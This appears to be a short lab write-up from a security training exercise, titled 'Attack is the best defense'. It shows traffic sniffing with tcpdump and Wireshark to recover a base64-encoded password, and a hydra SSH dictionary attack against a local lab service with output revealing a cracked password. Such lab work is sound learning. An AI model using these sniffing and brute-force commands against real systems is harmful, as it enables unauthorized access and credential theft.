# Attack is the best defense
[x] 0-sniffing
No other traffic was in or out (filtering was need)
run tcpdump [install if not installed]
```console
foo@bar:~$ tcpdump -w dump

```

In a seperate shell run the alx executable [make executable if not already]
```console
foo@bar:~$ ./alx
```
open the dump in wireshark
found a line with pass in it and extract it and used a base64 decoder to get the password

[ ] Dictionary attack
```console
foo@bar:~$ hydra -l sylvain -P xato-110char ssh://127.0.0.1 -s 2222
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 236238 login tries (l:1/p:236238), ~14765 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-24 01:17:19
```
